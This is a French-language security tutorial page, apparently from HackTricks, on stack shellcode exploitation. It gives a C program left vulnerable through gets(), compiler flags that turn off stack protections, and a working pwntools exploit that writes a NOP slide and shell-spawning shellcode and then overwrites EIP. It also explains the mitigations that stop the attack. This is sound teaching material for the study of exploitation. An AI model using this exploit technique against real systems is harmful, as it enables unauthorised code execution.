# Stack Shellcode

{{#include ../../../banners/hacktricks-training.md}}

## Informations de base

**Stack shellcode** est une technique utilisée dans l'exploitation binaire où un attaquant écrit du shellcode dans la pile d'un programme vulnérable, puis modifie le **Pointeur d'Instruction (IP)** ou le **Pointeur d'Instruction Étendu (EIP)** pour pointer vers l'emplacement de ce shellcode, provoquant son exécution. C'est une méthode classique utilisée pour obtenir un accès non autorisé ou exécuter des commandes arbitraires sur un système cible. Voici une explication du processus, y compris un exemple simple en C et comment vous pourriez écrire un exploit correspondant en utilisant Python avec **pwntools**.

### Exemple C : Un programme vulnérable

Commençons par un exemple simple d'un programme C vulnérable :
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
Ce programme est vulnérable à un dépassement de tampon en raison de l'utilisation de la fonction `gets()`.

### Compilation

Pour compiler ce programme tout en désactivant diverses protections (pour simuler un environnement vulnérable), vous pouvez utiliser la commande suivante :
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
- `-fno-stack-protector`: Désactive la protection de la pile.
- `-z execstack`: Rend la pile exécutable, ce qui est nécessaire pour exécuter le shellcode stocké sur la pile.
- `-no-pie`: Désactive l'exécutable indépendant de la position, ce qui facilite la prévision de l'adresse mémoire où notre shellcode sera situé.
- `-m32`: Compile le programme en tant qu'exécutable 32 bits, souvent utilisé pour la simplicité dans le développement d'exploits.

### Python Exploit utilisant Pwntools

Voici comment vous pourriez écrire un exploit en Python en utilisant **pwntools** pour effectuer une attaque **ret2shellcode** :
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
Ce script construit un payload composé d'un **NOP slide**, du **shellcode**, puis écrase le **EIP** avec l'adresse pointant vers le NOP slide, garantissant que le shellcode soit exécuté.

Le **NOP slide** (`asm('nop')`) est utilisé pour augmenter la chance que l'exécution "glisse" vers notre shellcode, peu importe l'adresse exacte. Ajustez l'argument `p32()` à l'adresse de départ de votre tampon plus un décalage pour atterrir dans le NOP slide.

## Protections

- [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **doit être désactivé** pour que l'adresse soit fiable à travers les exécutions, sinon l'adresse où la fonction sera stockée ne sera pas toujours la même et vous auriez besoin d'une fuite pour déterminer où la fonction win est chargée.
- [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/) doit également être désactivé ou l'adresse de retour EIP compromise ne sera jamais suivie.
- La protection **stack** [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md) empêcherait l'exécution du shellcode à l'intérieur de la pile car cette région ne serait pas exécutable.

## Autres Exemples & Références

- [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
- [https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html)
- 64 bits, ASLR avec fuite d'adresse de pile, écrire le shellcode et y sauter
- [https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html)
- 32 bits, ASLR avec fuite de pile, écrire le shellcode et y sauter
- [https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html)
- 32 bits, ASLR avec fuite de pile, comparaison pour empêcher l'appel à exit(), écraser une variable avec une valeur et écrire le shellcode et y sauter

{{#include ../../../banners/hacktricks-training.md}}
